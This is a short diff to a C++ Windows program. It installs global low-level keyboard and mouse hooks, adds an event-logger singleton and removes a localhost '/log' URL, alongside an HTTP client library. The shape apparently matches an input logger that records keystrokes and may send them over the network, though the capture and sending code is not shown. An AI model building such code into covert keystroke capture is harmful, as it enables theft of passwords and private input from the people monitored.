@@ -2,12 +2,13 @@
 #include <Windows.h>
 #include <cpr/cpr.h>
 
+#include "EventLogger.h"
 #include "MouseHandler.h"
 #include "KeyboardHandler.h"
 
-const char *DEBUG_URL = "http://127.0.0.1:8000/log";
-
 int main() {
+    EventLogger::getInstance().start();
+
     const HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(&KeyboardCallback), nullptr, 0);
     const HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&MouseCallback), nullptr, 0);
 
@@ -19,6 +20,8 @@ int main() {
 
     UnhookWindowsHookEx(keyboard);
     UnhookWindowsHookEx(mouse);
+
+    EventLogger::getInstance().stop();
 
     return 0;
 }
